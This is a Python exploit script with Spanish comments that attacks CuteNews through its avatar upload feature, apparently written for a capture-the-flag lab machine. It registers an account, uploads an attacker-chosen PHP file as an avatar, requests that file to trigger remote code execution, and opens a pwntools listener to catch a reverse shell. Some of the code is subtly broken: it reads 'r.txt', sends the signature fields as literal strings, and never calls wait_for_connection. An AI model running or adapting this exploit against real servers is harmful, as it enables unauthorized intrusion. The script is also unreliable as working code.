#!/usr/bin/python3
from pwn import * # pip3 install pwntools
import requests, signal, re
import pdb # debugging
import threading # hilos

# CTRL-C
def control_c(sig, frame):
    print('\n[**] Saliendo del programa [**]\n')
    sys.exit(1 )

signal.signal(signal.SIGINT, control_c)

if len(sys.argv) != 5:
    print('\nUso: python3 ' + sys.argv[0] + ' http://10.10.10.206/CuteNews/ usuario password file.php\n')
    sys.exit(1)

# variables
url = sys.argv[1]
usuario = sys.argv[2]
password = sys.argv[3]
archivo = sys.argv[4]
url_registro = url + 'index.php?register'    
url_valores = url + 'index.php?mod=main&opt=personal'
url_login = url + 'index.php'
url_rce = url + 'uploads/avatar_%s_%s' % (usuario,archivo)
lport = 8000

# proxy 
# burp = {'http': 'http://127.0.0.1:8080'}
# pdb.set_trace() # debug

def registerUser():
    post_data = {
        'action': 'register',
        'regusername': '%s' % usuario,
        'regnickname': '%s' % usuario,
        'regpassword': '%s' % password,
        'confirm': '%s' % password,
        'regemail': '%s@%s.com' % (usuario,usuario)
    }
    r = requests.post(url_registro, data=post_data) # proxies=burp para interceptar con burpsuite las requests
def uploadFile():
    s = requests.session()
    
    # inicio de sesion
    post_data = {
        'action': 'dologin',
        'username': '%s' % usuario,
        'password': '%s' % password
    }
    r = s.post(url_login, data=post_data)
    # validacion del inicio de sesion # r = s.get(url_valores) # print(r.text)

    # subida de archivo
    signatureKey = re.findall(r'name="__signature_key" value="(.*?)"', r.txt)[0] # regex para encontrar el valor de signatureKey
    signatureDsi = re.findall(r'name="__signature_dsi" value="(.*?)"', r.txt)[0] # regex para encontrar el valor de signatureDsi
    post_data = {
        'mod': 'main',
        'opt': 'personal',
        '__signature_key': 'signatureKey',
        '__signature_dsi': 'signatureDsi',
        'editpassword': '',
        'confirmpassword': '',
        'editnickname': '%s' % usuario,
    }

    f = open(archivo, 'r')
    contenido = f.read()
    archivo_a_subir = {'avatar_file': (archivo, contenido)}

    r = s.post(url_login, data=post_data, files=archivo_a_subir)
    r = s.get(url_rce)

# inicio del programa
if __name__ == '__main__':
    registerUser()

    try:
        threading.Thread(target=uploadFile, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection
    shell.interactive()
